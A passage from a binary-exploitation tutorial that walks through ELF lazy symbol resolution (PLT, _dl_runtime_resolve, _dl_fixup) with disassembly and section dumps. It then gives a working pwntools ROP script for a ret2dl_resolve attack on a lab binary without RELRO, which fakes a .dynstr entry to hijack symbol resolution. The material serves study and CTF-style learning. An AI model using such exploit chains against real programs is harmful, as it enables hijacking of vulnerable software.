  | _____________________    _____________________      _____________________
  | | Relocation table  |    |   Symbol table    |      |   String table    |
  | |_____rel.plt_______|    |_____.dynsym_______|      |______.dynstr______|
  | |       ...         |    |       ...         |      |       ...         |
  | |___________________|    |___________________|      |___________________|
  >>|      r_offset     |    |      st_name      |   |>>|      read\0       |
    |___________________|    |___________________|   |  |___________________|
    |      r_info       |__  |      st_info      |   |  |       ...         |
    |___________________|  | |___________________|   |  |___________________|
    |       ...         |  | |        ...        |   |  |      setbuf\0     |
    |___________________|  | |___________________|   |  |___________________|
    |      r_offset     |  | |      st_name      | __|  |       ...         |
    |___________________|  | |___________________|      |___________________|
    |      r_info       |  >>|      st_info      |      |                   |
    |___________________|    |___________________|      |___________________|
```

```
→   0x401050 <read@plt+0>     endbr64 
    0x401054 <read@plt+4>     bnd    jmp QWORD PTR [rip+0x236d]        # 0x4033c8 <read@got.plt>
    0x40105b <read@plt+11>    nop    DWORD PTR [rax+rax*1+0x0]
```
at this point the got holds `0x4033c8: 0x0000000000401030`
since this is the first call to read it is not resolved we need to setup the arguments for 
`_dl_runtime_resolve(elf_info , index)`
pushes the index in this case 0x0       
```
    0x401030                  endbr64 
→   0x401034                  push   0x0
    0x401039                  bnd    jmp 0x401020   
```

pushes the elf_info 0x4033c8:	0x00007ffff7ffe2e0       
```
	0x401020                  push   QWORD PTR [rip+0x2392]        # 0x4033b8
    0x401026                  bnd    jmp QWORD PTR [rip+0x2393]        # 0x4033c0
```

at this point we enter the resolving procedure starting with `_dl_runtime_resolve_xsavec`.

```
Dump of assembler code for function _dl_runtime_resolve_xsavec:
=> 0x00007ffff7fd8d30 <+0>:	endbr64 
   0x00007ffff7fd8d34 <+4>:	push   rbx
   0x00007ffff7fd8d35 <+5>:	mov    rbx,rsp
   0x00007ffff7fd8d38 <+8>:	and    rsp,0xffffffffffffffc0
   0x00007ffff7fd8d3c <+12>:	sub    rsp,QWORD PTR [rip+0x23f4d]        # 0x7ffff7ffcc90 <_rtld_global_ro+432>
   0x00007ffff7fd8d43 <+19>:	mov    QWORD PTR [rsp],rax
   0x00007ffff7fd8d47 <+23>:	mov    QWORD PTR [rsp+0x8],rcx
   0x00007ffff7fd8d4c <+28>:	mov    QWORD PTR [rsp+0x10],rdx
   0x00007ffff7fd8d51 <+33>:	mov    QWORD PTR [rsp+0x18],rsi
   0x00007ffff7fd8d56 <+38>:	mov    QWORD PTR [rsp+0x20],rdi
   0x00007ffff7fd8d5b <+43>:	mov    QWORD PTR [rsp+0x28],r8
   0x00007ffff7fd8d60 <+48>:	mov    QWORD PTR [rsp+0x30],r9
   0x00007ffff7fd8d65 <+53>:	mov    eax,0xee
   0x00007ffff7fd8d6a <+58>:	xor    edx,edx
   0x00007ffff7fd8d6c <+60>:	mov    QWORD PTR [rsp+0x250],rdx
   0x00007ffff7fd8d74 <+68>:	mov    QWORD PTR [rsp+0x258],rdx
   0x00007ffff7fd8d7c <+76>:	mov    QWORD PTR [rsp+0x260],rdx
   0x00007ffff7fd8d84 <+84>:	mov    QWORD PTR [rsp+0x268],rdx
   0x00007ffff7fd8d8c <+92>:	mov    QWORD PTR [rsp+0x270],rdx
   0x00007ffff7fd8d94 <+100>:	mov    QWORD PTR [rsp+0x278],rdx
   0x00007ffff7fd8d9c <+108>:	xsavec [rsp+0x40]
   0x00007ffff7fd8da1 <+113>:	mov    rsi,QWORD PTR [rbx+0x10]
   0x00007ffff7fd8da5 <+117>:	mov    rdi,QWORD PTR [rbx+0x8]
   0x00007ffff7fd8da9 <+121>:	call   0x7ffff7fd5e70 <_dl_fixup>
   0x00007ffff7fd8dae <+126>:	mov    r11,rax
   0x00007ffff7fd8db1 <+129>:	mov    eax,0xee
   0x00007ffff7fd8db6 <+134>:	xor    edx,edx
   0x00007ffff7fd8db8 <+136>:	xrstor [rsp+0x40]
   0x00007ffff7fd8dbd <+141>:	mov    r9,QWORD PTR [rsp+0x30]
   0x00007ffff7fd8dc2 <+146>:	mov    r8,QWORD PTR [rsp+0x28]
   0x00007ffff7fd8dc7 <+151>:	mov    rdi,QWORD PTR [rsp+0x20]
   0x00007ffff7fd8dcc <+156>:	mov    rsi,QWORD PTR [rsp+0x18]
   0x00007ffff7fd8dd1 <+161>:	mov    rdx,QWORD PTR [rsp+0x10]
   0x00007ffff7fd8dd6 <+166>:	mov    rcx,QWORD PTR [rsp+0x8]
   0x00007ffff7fd8ddb <+171>:	mov    rax,QWORD PTR [rsp]
   0x00007ffff7fd8ddf <+175>:	mov    rsp,rbx
   0x00007ffff7fd8de2 <+178>:	mov    rbx,QWORD PTR [rsp]
   0x00007ffff7fd8de6 <+182>:	add    rsp,0x18
   0x00007ffff7fd8dea <+186>:	jmp    r11
```

we save some values on the stack nothing special so far.
than we jump to `_dl_fixup(*elf_info , index)` `_dl_fixup(rdi,rsi)`
```
_dl_fixup (
   QWORD var_0 = 0x00007ffff7ffe2e0 → 0x0000000000000000,
   Elf64_Word var_1 = 0x0000000000000000
) 
```

```
Dump of assembler code for function _dl_fixup:
=> 0x00007ffff7fd5e70 <+0>:	endbr64 
   0x00007ffff7fd5e74 <+4>:	push   r13
   0x00007ffff7fd5e76 <+6>:	xor    r9d,r9d
   0x00007ffff7fd5e79 <+9>:	push   r12
   0x00007ffff7fd5e7b <+11>:	push   rbp
   0x00007ffff7fd5e7c <+12>:	mov    rbp,rdi
   0x00007ffff7fd5e7f <+15>:	push   rbx
   0x00007ffff7fd5e80 <+16>:	sub    rsp,0x18
   0x00007ffff7fd5e84 <+20>:	mov    rax,QWORD PTR [rdi+0x70]
   0x00007ffff7fd5e88 <+24>:	mov    r10,QWORD PTR [rax+0x8]
   0x00007ffff7fd5e8c <+28>:	mov    rax,QWORD PTR [rdi]
   0x00007ffff7fd5e8f <+31>:	test   BYTE PTR [rdi+0x31e],0x20
   0x00007ffff7fd5e96 <+38>:	je     0x7ffff7fd5e9e <_dl_fixup+46>
   0x00007ffff7fd5e98 <+40>:	add    r10,rax
   0x00007ffff7fd5e9b <+43>:	mov    r9,rax
   0x00007ffff7fd5e9e <+46>:	mov    rdx,QWORD PTR [rbp+0x68]
   0x00007ffff7fd5ea2 <+50>:	mov    ebx,esi
   0x00007ffff7fd5ea4 <+52>:	lea    rcx,[rbx+rbx*2]
   0x00007ffff7fd5ea8 <+56>:	mov    rdi,QWORD PTR [rdx+0x8]
   0x00007ffff7fd5eac <+60>:	mov    rdx,QWORD PTR [rbp+0xf8]
   0x00007ffff7fd5eb3 <+67>:	mov    rdx,QWORD PTR [rdx+0x8]
   0x00007ffff7fd5eb7 <+71>:	add    rdi,r9
   0x00007ffff7fd5eba <+74>:	lea    rsi,[rdx+rcx*8]
   0x00007ffff7fd5ebe <+78>:	add    rsi,r9
   0x00007ffff7fd5ec1 <+81>:	mov    r8,QWORD PTR [rsi+0x8]
   0x00007ffff7fd5ec5 <+85>:	mov    r12,QWORD PTR [rsi]
   0x00007ffff7fd5ec8 <+88>:	mov    rdx,r8
   0x00007ffff7fd5ecb <+91>:	add    r12,rax
   0x00007ffff7fd5ece <+94>:	shr    rdx,0x20
   0x00007ffff7fd5ed2 <+98>:	lea    rcx,[rdx+rdx*1]
   0x00007ffff7fd5ed6 <+102>:	add    rdx,rcx
   0x00007ffff7fd5ed9 <+105>:	lea    rdx,[r10+rdx*8]
   0x00007ffff7fd5edd <+109>:	mov    QWORD PTR [rsp],rdx
   0x00007ffff7fd5ee1 <+113>:	cmp    r8d,0x7
   0x00007ffff7fd5ee5 <+117>:	jne    0x7ffff7fd60dc <_dl_fixup+620>
   0x00007ffff7fd5eeb <+123>:	test   BYTE PTR [rdx+0x5],0x3
   0x00007ffff7fd5eef <+127>:	jne    0x7ffff7fd60b0 <_dl_fixup+576>
   0x00007ffff7fd5ef5 <+133>:	mov    r8,QWORD PTR [rbp+0x1d0]
   0x00007ffff7fd5efc <+140>:	test   r8,r8
   0x00007ffff7fd5eff <+143>:	je     0x7ffff7fd5f2c <_dl_fixup+188>
   0x00007ffff7fd5f01 <+145>:	add    rcx,r9
   0x00007ffff7fd5f04 <+148>:	add    rcx,QWORD PTR [r8+0x8]
   0x00007ffff7fd5f08 <+152>:	movzx  eax,WORD PTR [rcx]
   0x00007ffff7fd5f0b <+155>:	and    eax,0x7fff
   0x00007ffff7fd5f10 <+160>:	lea    rcx,[rax+rax*2]
   0x00007ffff7fd5f14 <+164>:	mov    rax,QWORD PTR [rbp+0x2e8]
   0x00007ffff7fd5f1b <+171>:	lea    r8,[rax+rcx*8]
   0x00007ffff7fd5f1f <+175>:	xor    eax,eax
   0x00007ffff7fd5f21 <+177>:	mov    r9d,DWORD PTR [r8+0x8]
   0x00007ffff7fd5f25 <+181>:	test   r9d,r9d
   0x00007ffff7fd5f28 <+184>:	cmove  r8,rax
   0x00007ffff7fd5f2c <+188>:	mov    ecx,DWORD PTR fs:0x18
   0x00007ffff7fd5f34 <+196>:	mov    eax,0x1
   0x00007ffff7fd5f39 <+201>:	test   ecx,ecx
   0x00007ffff7fd5f3b <+203>:	je     0x7ffff7fd5f4e <_dl_fixup+222>
   0x00007ffff7fd5f3d <+205>:	mov    DWORD PTR fs:0x1c,0x1
   0x00007ffff7fd5f49 <+217>:	mov    eax,0x5
   0x00007ffff7fd5f4e <+222>:	mov    edx,DWORD PTR [rdx]
   0x00007ffff7fd5f50 <+224>:	mov    r10,rsp
   0x00007ffff7fd5f53 <+227>:	push   0x0
   0x00007ffff7fd5f55 <+229>:	mov    r9d,0x1
   0x00007ffff7fd5f5b <+235>:	push   rax
   0x00007ffff7fd5f5c <+236>:	mov    rcx,QWORD PTR [rbp+0x398]
   0x00007ffff7fd5f63 <+243>:	mov    rsi,rbp
   0x00007ffff7fd5f66 <+246>:	add    rdi,rdx
   0x00007ffff7fd5f69 <+249>:	mov    rdx,r10
   0x00007ffff7fd5f6c <+252>:	call   0x7ffff7fcf0d0 <_dl_lookup_symbol_x>
   0x00007ffff7fd5f71 <+257>:	mov    r13,rax
   0x00007ffff7fd5f74 <+260>:	mov    eax,DWORD PTR fs:0x18
   0x00007ffff7fd5f7c <+268>:	pop    rsi
   0x00007ffff7fd5f7d <+269>:	pop    rdi
   0x00007ffff7fd5f7e <+270>:	test   eax,eax
   0x00007ffff7fd5f80 <+272>:	jne    0x7ffff7fd6000 <_dl_fixup+400>
   0x00007ffff7fd5f82 <+274>:	mov    rdx,QWORD PTR [rsp]
   0x00007ffff7fd5f86 <+278>:	test   rdx,rdx
   0x00007ffff7fd5f89 <+281>:	je     0x7ffff7fd6048 <_dl_fixup+472>
   0x00007ffff7fd5f8f <+287>:	cmp    WORD PTR [rdx+0x6],0xfff1
   0x00007ffff7fd5f94 <+292>:	je     0x7ffff7fd6060 <_dl_fixup+496>
   0x00007ffff7fd5f9a <+298>:	test   r13,r13
   0x00007ffff7fd5f9d <+301>:	je     0x7ffff7fd6060 <_dl_fixup+496>
   0x00007ffff7fd5fa3 <+307>:	mov    rax,QWORD PTR [r13+0x0]
   0x00007ffff7fd5fa7 <+311>:	add    rax,QWORD PTR [rdx+0x8]
   0x00007ffff7fd5fab <+315>:	mov    QWORD PTR [rsp+0x8],rax
   0x00007ffff7fd5fb0 <+320>:	movzx  edx,BYTE PTR [rdx+0x4]
   0x00007ffff7fd5fb4 <+324>:	and    edx,0xf
   0x00007ffff7fd5fb7 <+327>:	cmp    dl,0xa
   0x00007ffff7fd5fba <+330>:	je     0x7ffff7fd60d0 <_dl_fixup+608>
   0x00007ffff7fd5fc0 <+336>:	mov    rdx,QWORD PTR [rbp+0x340]
   0x00007ffff7fd5fc7 <+343>:	test   rdx,rdx
   0x00007ffff7fd5fca <+346>:	je     0x7ffff7fd5fe1 <_dl_fixup+369>
   0x00007ffff7fd5fcc <+348>:	shl    rbx,0x5
   0x00007ffff7fd5fd0 <+352>:	add    rbx,rdx
   0x00007ffff7fd5fd3 <+355>:	mov    eax,DWORD PTR [rbx+0x1c]
   0x00007ffff7fd5fd6 <+358>:	test   eax,eax
   0x00007ffff7fd5fd8 <+360>:	je     0x7ffff7fd6070 <_dl_fixup+512>
   0x00007ffff7fd5fde <+366>:	mov    rax,QWORD PTR [rbx]
   0x00007ffff7fd5fe1 <+369>:	mov    edx,DWORD PTR [rip+0x26b49]        # 0x7ffff7ffcb30 <_rtld_global_ro+80>
   0x00007ffff7fd5fe7 <+375>:	test   edx,edx
   0x00007ffff7fd5fe9 <+377>:	jne    0x7ffff7fd5fef <_dl_fixup+383>
   0x00007ffff7fd5feb <+379>:	mov    QWORD PTR [r12],rax
   0x00007ffff7fd5fef <+383>:	add    rsp,0x18
   0x00007ffff7fd5ff3 <+387>:	pop    rbx
   0x00007ffff7fd5ff4 <+388>:	pop    rbp
   0x00007ffff7fd5ff5 <+389>:	pop    r12
   0x00007ffff7fd5ff7 <+391>:	pop    r13
   0x00007ffff7fd5ff9 <+393>:	ret    
   0x00007ffff7fd5ffa <+394>:	nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff7fd6000 <+400>:	xor    eax,eax
   0x00007ffff7fd6002 <+402>:	xchg   DWORD PTR fs:0x1c,eax
   0x00007ffff7fd600a <+410>:	cmp    eax,0x2
   0x00007ffff7fd600d <+413>:	jne    0x7ffff7fd5f82 <_dl_fixup+274>
   0x00007ffff7fd6013 <+419>:	xor    r10d,r10d
   0x00007ffff7fd6016 <+422>:	mov    edx,0x1
   0x00007ffff7fd601b <+427>:	mov    esi,0x81
   0x00007ffff7fd6020 <+432>:	mov    rax,QWORD PTR fs:0x10
   0x00007ffff7fd6029 <+441>:	lea    rdi,[rax+0x1c]
   0x00007ffff7fd602d <+445>:	mov    eax,0xca
   0x00007ffff7fd6032 <+450>:	syscall 
   0x00007ffff7fd6034 <+452>:	mov    rdx,QWORD PTR [rsp]
   0x00007ffff7fd6038 <+456>:	test   rdx,rdx
   0x00007ffff7fd603b <+459>:	jne    0x7ffff7fd5f8f <_dl_fixup+287>
   0x00007ffff7fd6041 <+465>:	nop    DWORD PTR [rax+0x0]
   0x00007ffff7fd6048 <+472>:	mov    QWORD PTR [rsp+0x8],0x0
   0x00007ffff7fd6051 <+481>:	xor    eax,eax
   0x00007ffff7fd6053 <+483>:	jmp    0x7ffff7fd5fc0 <_dl_fixup+336>
   0x00007ffff7fd6058 <+488>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x00007ffff7fd6060 <+496>:	xor    eax,eax
   0x00007ffff7fd6062 <+498>:	jmp    0x7ffff7fd5fa7 <_dl_fixup+311>
   0x00007ffff7fd6067 <+503>:	nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff7fd6070 <+512>:	mov    rdx,QWORD PTR [rsp]
   0x00007ffff7fd6074 <+516>:	lea    rcx,[rsp+0x8]
   0x00007ffff7fd6079 <+521>:	mov    r8,r13
   0x00007ffff7fd607c <+524>:	mov    rsi,rbx
   0x00007ffff7fd607f <+527>:	mov    rdi,rbp
   0x00007ffff7fd6082 <+530>:	call   0x7ffff7fde900 <_dl_audit_symbind>
   0x00007ffff7fd6087 <+535>:	mov    ecx,DWORD PTR [rip+0x26aa3]        # 0x7ffff7ffcb30 <_rtld_global_ro+80>
   0x00007ffff7fd608d <+541>:	mov    rax,QWORD PTR [rsp+0x8]
   0x00007ffff7fd6092 <+546>:	test   ecx,ecx
   0x00007ffff7fd6094 <+548>:	jne    0x7ffff7fd5fef <_dl_fixup+383>
   0x00007ffff7fd609a <+554>:	mov    QWORD PTR [rbx],rax
   0x00007ffff7fd609d <+557>:	mov    DWORD PTR [rbx+0x1c],0x1
   0x00007ffff7fd60a4 <+564>:	mov    rax,QWORD PTR [rsp+0x8]
   0x00007ffff7fd60a9 <+569>:	jmp    0x7ffff7fd5fe1 <_dl_fixup+369>
   0x00007ffff7fd60ae <+574>:	xchg   ax,ax
   0x00007ffff7fd60b0 <+576>:	xor    ecx,ecx
   0x00007ffff7fd60b2 <+578>:	cmp    WORD PTR [rdx+0x6],0xfff1
   0x00007ffff7fd60b7 <+583>:	mov    r13,rbp
   0x00007ffff7fd60ba <+586>:	cmove  rax,rcx
   0x00007ffff7fd60be <+590>:	add    rax,QWORD PTR [rdx+0x8]
   0x00007ffff7fd60c2 <+594>:	mov    QWORD PTR [rsp+0x8],rax
   0x00007ffff7fd60c7 <+599>:	jmp    0x7ffff7fd5fb0 <_dl_fixup+320>
   0x00007ffff7fd60cc <+604>:	nop    DWORD PTR [rax+0x0]
   0x00007ffff7fd60d0 <+608>:	call   rax
   0x00007ffff7fd60d2 <+610>:	mov    QWORD PTR [rsp+0x8],rax
   0x00007ffff7fd60d7 <+615>:	jmp    0x7ffff7fd5fc0 <_dl_fixup+336>
   0x00007ffff7fd60dc <+620>:	lea    rcx,[rip+0x1e09d]        # 0x7ffff7ff4180 <__PRETTY_FUNCTION__.1>
   0x00007ffff7fd60e3 <+627>:	mov    edx,0x3f
   0x00007ffff7fd60e8 <+632>:	lea    rsi,[rip+0x1b046]        # 0x7ffff7ff1135
   0x00007ffff7fd60ef <+639>:	lea    rdi,[rip+0x1e052]        # 0x7ffff7ff4148
   0x00007ffff7fd60f6 <+646>:	call   0x7ffff7fe1460 <__GI___assert_fail>
```

we set the elf_info as rbp and setup some pointers 

at ` 0x7ffff7fd5e88 <_dl_fixup+24>   mov    r10, QWORD PTR [rax+0x8]` we load the pointer to the DT_SYMTAB into r10

```
                             //
                             // .dynsym 
                             // SHT_DYNSYM  [0x400390 - 0x400437]
                             // ram:00400390-ram:00400437
                             //
                             __DT_SYMTAB                                     XREF[2]:     00403268(*), 
                                                                                          _elfSectionHeaders::00000190(*)  
        00400390 00 00 00        Elf64_Sy
                 00 00 00 
                 00 00 00 
           00400390 00 00 00 00 00  Elf64_Sym                         [0]                               XREF[2]:     00403268(*), 
                    00 00 00 00 00                                                                                   _elfSectionHeaders::00000190(*)  
                    00 00 00 00 00
              00400390 00 00 00 00     ddw       0h                      st_name                           XREF[2]:     00403268(*),                                                                                                       
              00400394 00              db        0h                      st_info
              00400395 00              db        0h                      st_other
              00400396 00 00           dw        0h                      st_shndx
              00400398 00 00 00 00 00  dq        0h                      st_value
                       00 00 00
              004003a0 00 00 00 00 00  dq        0h                      st_size
                       00 00 00
           004003a8 11 00 00 00 12  Elf64_Sym                         [1]
                    00 00 00 00 00 
                    00 00 00 00 00
              004003a8 11 00 00 00     ddw       11h                     st_name       read
              004003ac 12              db        12h                     st_info
              004003ad 00              db        0h                      st_other
              004003ae 00 00           dw        0h                      st_shndx
              004003b0 00 00 00 00 00  dq        0h                      st_value
                       00 00 00
              004003b8 00 00 00 00 00  dq        0h                      st_size
                       00 00 00
           004003c0 25 00 00 00 12  Elf64_Sym                         [2]           __libc_start_main
                    00 00 00 00 00 
                    00 00 00 00 00
           004003d8 43 00 00 00 20  Elf64_Sym                         [3]           __gmon_start__
                    00 00 00 00 00 
                    00 00 00 00 00
           004003f0 1d 00 00 00 12  Elf64_Sym                         [4]           setvbuf
                    00 00 00 00 00 
                    00 00 00 00 00
           00400408 16 00 00 00 11  Elf64_Sym                         [5]           stdout
                    00 1a 00 f0 33 
                    40 00 00 00 00
           00400420 0b 00 00 00 11  Elf64_Sym                         [6]           stdin
                    00 1a 00 00 34 
                    40 00 00 00 00

```

at `0x00007ffff7fd5e9e <+46>:	mov    rdx,QWORD PTR [rbp+0x68]` we load the pointer to the .dynamic entry for the DT_STRTAB section of the binary into the rdx

.dynamic
```
           00403250 05 00 00 00 00  Elf64_Dyn                         [8]
                    00 00 00 38 04 
                    40 00 00 00 00
              00403250 05 00 00 00 00  Elf64_Dy  DT_STRTAB               d_tag         DT_STRTAB - Addres
                       00 00 00
              00403258 38 04 40 00 00  dq        __DT_STRTAB             d_val
                       00 00 00
```

at `0x7ffff7fd5ea8 <_dl_fixup+56>   mov    rdi, QWORD PTR [rdx+0x8]` we load the pointer to the DT_STRTAB into rdi

DT_STRTAB
```
                             //
                             // .dynstr 
                             // SHT_STRTAB  [0x400438 - 0x400489]
                             // ram:00400438-ram:00400489
                             //
                             __DT_STRTAB                                     XREF[2]:     00403258(*), 
                                                                                          _elfSectionHeaders::000001d0(*)  
        00400438 00              ??         00h
        00400439 6c 69 62        ds         "libc.so.6"
                 63 2e 73 
                 6f 2e 36 00
        00400443 73 74 64        ds         "stdin"
                 69 6e 00
        00400449 72 65 61        ds         "read"
                 64 00
        0040044e 73 74 64        ds         "stdout"
                 6f 75 74 00
        00400455 73 65 74        ds         "setvbuf"
                 76 62 75 
                 66 00
        0040045d 5f 5f 6c        ds         "__libc_start_main"
                 69 62 63 
                 5f 73 74 
        0040046f 47 4c 49        ds         "GLIBC_2.2.5"
                 42 43 5f 
                 32 2e 32 
        0040047b 5f 5f 67        ds         "__gmon_start__"
                 6d 6f 6e 
                 5f 73 74 

```

at `0x7ffff7fd5eac <_dl_fixup+60>   mov    rdx, QWORD PTR [rbp+0xf8]` we load the pointer to the DT_JMPREL entry of the .dynamic section into rdx 

```
           004032d0 17 00 00 00 00  Elf64_Dyn                         [16]
                    00 00 00 18 05 
                    40 00 00 00 00
              004032d0 17 00 00 00 00  Elf64_Dy  DT_JMPREL               d_tag         DT_JMPREL - Addres
                       00 00 00
              004032d8 18 05 40 00 00  dq        __DT_JMPREL             d_val
                       00 00 00
```

at `0x7ffff7fd5eb3 <_dl_fixup+67>   mov    rdx, QWORD PTR [rdx+0x8]` we load a pointer to the actual `DT_JMPREL` into rdx

```
                             //
                             // .rela.plt 
                             // SHT_RELA  [0x400518 - 0x400547]
                             // ram:00400518-ram:00400547
                             //
                             __DT_JMPREL                                     XREF[2]:     004032d8(*), 
                                                                                          _elfSectionHeaders::000002d0(*)  
        00400518 c8 33 40        Elf64_Re
                 00 00 00 
                 00 00 07 
           00400518 c8 33 40 00 00  Elf64_Rela                        [0]                               XREF[2]:     004032d8(*), 
                    00 00 00 07 00                                                                                   _elfSectionHeaders::000002d0(*)  
                    00 00 01 00 00
              00400518 c8 33 40 00 00  dq        4033C8h                 r_offset      location to apply   XREF[2]:     004032d8(*), 
                       00 00 00                                                                                         _elfSectionHeaders::000002d0(*)  
              00400520 07 00 00 00 01  dq        100000007h              r_info        the symbol table i
                       00 00 00
              00400528 00 00 00 00 00  dq        0h                      r_addend      a constant addend 
                       00 00 00
           00400530 d0 33 40 00 00  Elf64_Rela                        [1]
                    00 00 00 07 00 
                    00 00 04 00 00
              00400530 d0 33 40 00 00  dq        4033D0h                 r_offset      location to apply 
                       00 00 00
              00400538 07 00 00 00 04  dq        400000007h              r_info        the symbol table i
                       00 00 00
              00400540 00 00 00 00 00  dq        0h                      r_addend      a constant addend 
                       00 00 00
```

at `0x7ffff7fd5ec1 <_dl_fixup+81>   mov    r8, QWORD PTR [rsi+0x8]` we load the r_info of the (index) entry of the `DT_JMPREL`

at`0x7ffff7fd5ec5 <_dl_fixup+85>   mov    r12, QWORD PTR [rsi]` we load the r_offset of the (index) entry of the `DT_JMPREL` (at this point its not verry usefull to mess with this but in some cases it could be ;) )

at `0x7ffff7fd5ed9 <_dl_fixup+105>  lea    rdx, [r10+rdx*8]` we load a ptr to the (r_info = 1) entry of the `DT_SYMTAB` into rdx

```
           004003a8 11 00 00 00 12  Elf64_Sym                         [1]
                    00 00 00 00 00 
                    00 00 00 00 00
              004003a8 11 00 00 00     ddw       11h                     st_name       read
              004003ac 12              db        12h                     st_info
              004003ad 00              db        0h                      st_other
              004003ae 00 00           dw        0h                      st_shndx
              004003b0 00 00 00 00 00  dq        0h                      st_value
                       00 00 00
              004003b8 00 00 00 00 00  dq        0h                      st_size
                       00 00 00
```
at `0x7ffff7fd5ee1 <_dl_fixup+113>  cmp    r8d, 0x7` we compare a checksum so the `r_info` allways need to look like this 0x100000007h! 

at `0x7ffff7fd5f4e <_dl_fixup+222>  mov    edx, DWORD PTR [rdx]` we load the st_name value of the DT_SYMTAB entry into edx
   
at `0x7ffff7fd5f66 <_dl_fixup+246>  add    rdi, rdx` we add the st_name to the pointer of the DT_STRTAB to get the pointer to the "read" string inside the DT_STRTAB

at `0x7ffff7fd5f6c <_dl_fixup+252>  call   0x7ffff7fcf0d0 <_dl_lookup_symbol_x>` we call the lookup function which basically searches throu all linked libs to find a function which matches the name provided in rdi (rdi currently holds a pointer to the DT_STRTAB enrty "read")

for the ret2dl_resolve exploit we dont need to know how that works but i would reccomend you at least understand the concecpt of lazy loading.




we pushed 0 so we look at the first entry of the Relocation table and find the r_info holding 100000007h for now we only care about the 1 which is the offset for the Symbol table  

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/Relocation_table.png">

in the Symbole table we look at offset 1 and find the st_name which holds the offset 10h
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/Symbole_table.png">
		
in the String table we look at ofset 10h and find the string puts
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/String_Table.png">



</div>
</details>




<details>
    <summary>ret2dl_resolve method 1. (PIE is off // RELRO off)</summary>
        <div>
		
# ret2dl_resolve method 1. (PIE is off // RELRO off)

Prerequisites
1. IP controll
2. ability to write to memory we use read() and a mov [reg],reg and corespoding pop gadgets to write our fake frame/dynstr entry.  (if we cant find a pop rdx we could ret2csu before)

in the .dynamic section there is a pointer to the String table .dynstr if RELRO is off this section is actually writeable and we can change the pointer to .dynstr
		
```
gef➤  vmmap 0x4031d0     			#.dynamic start here
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000403000 0x0000000000404000 0x0000000000002000 rw- /home/bex/Desktop/re2dl/resolve_no_relro		
```
		
0x4031d0 + 0x88 = 0x403258
		
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/nRELROdynamicSection_no_relro.png">
		
if we cange d_val to point to a section in the .bss we can basically copy the .dynstr and replace an entry with our own String.
or just place our fake String at the right offset from the start of our fake_dynstr we use setbuf to overwrite it with puts.
		
the offset is 0x1d 0x400455 - 0x400438 = 0x1d
		
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/dynstr_new.png">
		
we place the fake_frame @ 0x403580 and the fake setbuf entry @0x403580+0x1d = 0x40359d

```
 ___________________      ___________________ 
|   Symbole table   |    |    String table   | <<<______
|______.dynsym______|    |______.dynstr______|          |
|        ...        |    |        ...        |          |
|___________________|    |___________________|          |
|       st_name     |_   |       read\0      |          |
|___________________| |  |___________________|          |
|       st_info     | |>>|       puts\0      |          |
|___________________| .  |___________________|          |
        ...............                .................|_______
	.	 ___________________   .  ___________________   |
	.	|   Writeable area  |<<. |      .dynamic     |  |
	.	|________.bss_______|    |___________________|  |
	.	|        ...        |    |        ...        |  |
	.	|___________________|    |___________________|  |
	.	|       read\0      |    |  d_tag: DT_STRTAB |  |
	.	|___________________|    |___________________|  |
	.....>>>|       execve\0    |    |       d_val       |__|
		|___________________|    |___________________|

```
		

		
		
```
#!/usr/bin/env python3
from pwn import *


fname = 'resolve_no_relro'
ip = '0.0.0.0'
port = 1337 #change this
context.binary = elf = ELF('resolve_no_relro')




LOCAL = True

if LOCAL:
    r = process(fname,aslr=True)

    gdbscript="""
    b *main
    b *0x00000000004011c8
    b *0x00000000004011c0
    b *0x401044

    """
    #set follow-fork-mode

    attach('resolve_no_relro',gdbscript=gdbscript)
else:
    r = remote(ip, port)

s = lambda x : r.send(x)
rl = lambda : r.recvline()
rlb = lambda : r.recvlineb()
sl = lambda x : r.sendline(x)
ru = lambda x :r.recvuntil(x)
rcb = lambda x :r.recvb(x)
sla = lambda x,y : r.sendlineafter(x,y)
inter = lambda : r.interactive()


def pwn():


	pop_rdi		= 0x401263
	pop_rsi_r15	= 0x401261
	pop_rdx		= 0x4011d1
	read = elf.plt['read']
	mov_p_rdi_rdx = 0x4011d4

	dl_resolve_setbuf = 0x401044 			#push index (1) + elf_info # the normal resolve for setbuf

	dynaminc = 0x4031d0
	dynaminc_DT_STRTAB = dynaminc + 0x88    #here we have to place our pointer to fake_dynstr



	fake_frame_addr = 0x403580 						#here our fake frame starts 
	fake_dynstr_entry_addr = fake_frame_addr + 0x1d #0x1d cause the st_name for setbuf is 0x1d so the resolve() looks at #0x40359d for the string


	#fake dysntr entry #we dont need to put the whole frame into memory only the right dynstr entry at the right offset from fake_frame start addr 
	fake_dynstr_entry = b'puts\x00'						

	len_fake_dynstr_entry = len(fake_dynstr_entry)


	payload = b''
	payload += b'A'*24				    				#pad

	#write our fake_frame (fake_dynstr) into .bss
	payload += p64(pop_rdi)
	payload += p64(0x00)			    					#read from stdin
	payload += p64(pop_rsi_r15)
	payload += p64(fake_dynstr_entry_addr)
	payload += p64(0x00)			    					#junk r15
	payload += p64(pop_rdx)
	payload += p64(len_fake_dynstr_entry)
	payload += p64(read)

	#overwrite pointer in .dynamic to .dynstr at offset 0x403258 - 0x4031d0 = 0x88
	payload += p64(pop_rdi)				
	payload += p64(dynaminc_DT_STRTAB)						#where in the .dynamic section on the pointer to .dynstr
	payload += p64(pop_rdx)				
	payload += p64(fake_frame_addr)							#what the pointer to our fake dynstr
	payload += p64(mov_p_rdi_rdx)


	#set args for function we want to resolve
	payload += p64(pop_rdi)
	payload += p64(0x400000)							#argument for the fake function we will resolve
	payload += p64(dl_resolve_setbuf)
	payload += p64(0x11111111111111)*4						#we crash here 

	input('press enter to send Payload')
	s(payload)
	input('press enter to write frame')
	s(fake_dynstr_entry)

	inter()

if __name__ == '__main__':
    pwn()



		
```

</div>
</details>


<details>
    <summary>ret2dl_resolve method 2. (PIE is off// partial RELRO)</summary>
        <div>

# ret2dl_resolve method 2. (PIE is off// partial RELRO)


Prerequisites
1. IP controll
